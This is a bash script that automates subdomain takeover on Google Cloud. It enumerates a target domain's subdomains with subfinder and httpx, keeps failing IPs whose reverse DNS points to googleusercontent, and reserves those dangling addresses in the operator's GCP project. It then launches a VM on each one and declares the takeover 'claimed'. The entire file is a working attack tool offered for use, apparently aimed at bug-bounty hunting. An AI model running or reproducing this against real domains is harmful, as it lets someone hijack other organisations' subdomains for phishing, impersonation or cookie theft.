#!/bin/bash
#By: Joshua T. Buxton
#If you are reading this, you're pretty cool

~/go/bin/httpx -update

# Initialize Variables
TARGET_TLD=""
PROJECT=""
ZONE=""

DIR=$(pwd)

handle_exceptions() {
    echo "An error occurred while processing the options."
    exit 1
}

# Parse Command-Line Args
while getopts ":t:p:z:" opt; do
    case "${opt}" in
        t)
            TARGET_TLD=${OPTARG}
            ;;
        p)
            PROJECT=${OPTARG}
            ;;
        z)
            ZONE=${OPTARG}
            ;;
        *)
            handle_exceptions
            ;;
    esac
done

# Run subfinder to check for new subdomains if any...
# anew appends only new lines to the master file and outputs them to stdout; no re-append needed
~/go/bin/subfinder -provider-config "$HOME/.config/subfinder/provider-config.yaml" -d "$TARGET_TLD" \
    | anew "$DIR/output/$TARGET_TLD/$TARGET_TLD.txt" > "$DIR/output/$TARGET_TLD/$TARGET_TLD-added-lines.txt"

wordcount=$(wc -l < "$DIR/output/$TARGET_TLD/$TARGET_TLD-added-lines.txt")
if [[ "$wordcount" -ge 1 ]]; then
    echo "$wordcount new subdomain(s) discovered."
else
    echo "No new subdomains discovered."
fi

# Probe all subdomains; extract IPs from lines where HTTP probing FAILED
# Use > to overwrite so stale results from prior runs don't carry over
~/go/bin/httpx -l "$DIR/output/$TARGET_TLD/$TARGET_TLD.txt" -probe -ip \
    | grep -i "FAILED" \
    | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' \
    > "$DIR/output/$TARGET_TLD/$TARGET_TLD.httpx.out"

# Reset candidates file each run, then check each failed IP for Google ownership via reverse DNS
> "$DIR/output/$TARGET_TLD/potential_candidates.txt"
while IFS= read -r ip; do
    [[ -z "$ip" ]] && continue
    if nslookup "$ip" | grep -qi "googleusercontent"; then
        echo "Found potential candidate for Subdomain Takeover: $ip"
        echo "$ip" >> "$DIR/output/$TARGET_TLD/potential_candidates.txt"
    fi
done < "$DIR/output/$TARGET_TLD/$TARGET_TLD.httpx.out"

sort -u "$DIR/output/$TARGET_TLD/potential_candidates.txt" > "$DIR/output/$TARGET_TLD/IP_Only.txt"
wordcount2=$(wc -l < "$DIR/output/$TARGET_TLD/IP_Only.txt")

if [[ "$wordcount2" -lt 1 ]]; then
    echo "No potentially vulnerable subdomains found for $TARGET_TLD"
    exit 0
fi

# Derive the default compute service account from the project number
PROJECT_NUMBER=$(gcloud projects describe "$PROJECT" --format="value(projectNumber)")
SERVICE_ACCOUNT="${PROJECT_NUMBER}-compute@developer.gserviceaccount.com"

# Fallback region from the user-provided zone (e.g., us-south1-a -> us-south1)
FALLBACK_REGION="${ZONE%-*}"

# Sanitize TARGET_TLD for use in GCP resource names (dots -> hyphens)
SAFE_TLD="${TARGET_TLD//\./-}"

# Download GCP published IP ranges once for region lookups
GCP_RANGES_FILE=$(mktemp)
echo "Fetching GCP IP ranges..."
curl -s "https://www.gstatic.com/ipranges/cloud.json" -o "$GCP_RANGES_FILE"

# For each candidate IP: look up its GCP region, pick a zone in that region, then attempt reservation
while IFS= read -r target_ip; do
    [[ -z "$target_ip" ]] && continue

    echo "Looking up GCP region for IP: $target_ip"

    ip_region=$(python3 - "$target_ip" "$GCP_RANGES_FILE" <<'EOF'
import json, ipaddress, sys
ip = sys.argv[1]
with open(sys.argv[2]) as f:
    data = json.load(f)
for entry in data.get('prefixes', []):
    prefix = entry.get('ipv4Prefix')
    if prefix:
        try:
            if ipaddress.ip_address(ip) in ipaddress.ip_network(prefix, strict=False):
                print(entry.get('scope', ''))
                break
        except ValueError:
            continue
EOF
)

    if [[ -z "$ip_region" ]]; then
        echo "Could not determine GCP region for $target_ip — falling back to provided zone ($ZONE)."
        ip_region="$FALLBACK_REGION"
        ip_zone="$ZONE"
    else
        echo "IP $target_ip is in GCP region: $ip_region"
        ip_zone=$(gcloud compute zones list \
            --filter="region:$ip_region AND status=UP" \
            --format="value(name)" \
            --project="$PROJECT" | head -1)

        if [[ -z "$ip_zone" ]]; then
            echo "No available zones found in region $ip_region — falling back to provided zone ($ZONE)."
            ip_zone="$ZONE"
        fi
    fi

    echo "Attempting to reserve $target_ip in region $ip_region (zone: $ip_zone)..."

    if gcloud compute addresses create "takeover-$SAFE_TLD" \
        --addresses="$target_ip" \
        --region="$ip_region" \
        --project="$PROJECT" 2>/dev/null; then

        echo "Successfully reserved $target_ip — creating VM in $ip_zone..."

        gcloud compute instances create "subdomain-takeover-$SAFE_TLD" \
            --project="$PROJECT" \
            --zone="$ip_zone" \
            --machine-type=e2-medium \
            --network-interface="address=takeover-$SAFE_TLD,network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default" \
            --maintenance-policy=MIGRATE \
            --provisioning-model=STANDARD \
            --service-account="$SERVICE_ACCOUNT" \
            --scopes=https://www.googleapis.com/auth/cloud-platform \
            --tags=http-server,https-server \
            --create-disk="auto-delete=yes,boot=yes,device-name=subdomain-takeover-$SAFE_TLD,image=projects/debian-cloud/global/images/debian-11-bullseye-v20240110,mode=rw,size=10,type=projects/$PROJECT/zones/$ip_zone/diskTypes/pd-standard" \
            --no-shielded-secure-boot \
            --shielded-vtpm \
            --shielded-integrity-monitoring \
            --labels=goog-ec-src=vm_add-gcloud \
            --reservation-affinity=any

        echo "VM created with IP $target_ip in $ip_zone — subdomain takeover candidate claimed."
        rm -f "$GCP_RANGES_FILE"
        exit 0
    else
        echo "IP $target_ip could not be reserved in region $ip_region."
    fi
done < "$DIR/output/$TARGET_TLD/IP_Only.txt"

rm -f "$GCP_RANGES_FILE"
echo "None of the candidate IPs could be reserved for $TARGET_TLD"
exit 1
